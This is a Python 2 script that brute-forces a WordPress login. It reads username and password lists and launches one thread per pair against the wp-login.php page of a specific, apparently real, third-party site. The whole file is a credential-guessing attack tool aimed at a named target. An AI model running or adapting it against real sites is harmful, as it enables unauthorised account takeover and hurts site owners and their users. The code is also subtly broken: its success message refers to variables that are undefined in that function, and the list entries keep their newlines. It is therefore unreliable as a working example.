#!/bin/env python
# -*- coding: utf-8 -*-

import json
import re
import urllib
import urllib2
import threading
import thread
import subprocess

def get_lines(file_name):
    f = open(file_name)
    return f.readlines()
    
def check_passwd(username,password,url):
    postdata = urllib.urlencode({
    "log":username,
    "pwd":password,
    "wp-submit":"登陆" })

    request = urllib2.Request(url,postdata )
    response = urllib2.urlopen(request)
    if response.code != 200:
        print response.code
        print response.read()
        thread.exit_thread()
    else:
        r = response.read()
        m = re.search("login_error",r)
        if not m:
            print "user is %s;passwd is %s" % (i,j)
        thread.exit_thread()

    
def main():
    users = get_lines("username")
    password = get_lines("password")
    url = "http://de.appchina.com/wp-login.php"

    thread_list = []
    for i in users:
        for j in password:
            t = threading.Thread(target = check_passwd, args = (i,j,url))
            thread_list.append(t)
    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join()


if __name__ == '__main__':
    main()
